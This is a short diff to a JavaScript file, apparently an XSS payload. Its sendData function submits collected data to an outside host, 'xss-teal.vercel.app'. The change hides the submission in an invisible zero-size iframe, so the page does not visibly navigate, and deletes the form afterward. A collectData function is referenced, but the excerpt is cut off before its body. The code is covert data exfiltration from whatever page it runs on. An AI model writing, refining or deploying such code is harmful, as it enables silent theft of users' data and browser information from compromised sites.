@@ -24,10 +24,17 @@ function safe(val) {
 }
 
 function sendData(payload) {
+  var iframe = document.createElement('iframe');
+  iframe.style.display = 'none';
+  iframe.style.width = '0';
+  iframe.style.height = '0';
+  iframe.style.border = 'none';
+  document.body.appendChild(iframe);
+  
   var form = document.createElement('form');
   form.method = 'POST';
-  form.action = 'https://b0a.vercel.app/';
-  form.style.display = 'none';
+  form.action = 'https://xss-teal.vercel.app/';
+  form.target = iframe.name = 'hiddenFrame' + Date.now();
   
   var input = document.createElement('input');
   input.name = 'data';
@@ -36,6 +43,7 @@ function sendData(payload) {
   
   document.body.appendChild(form);
   form.submit();
+  document.body.removeChild(form);
 }
 
 function collectData() {
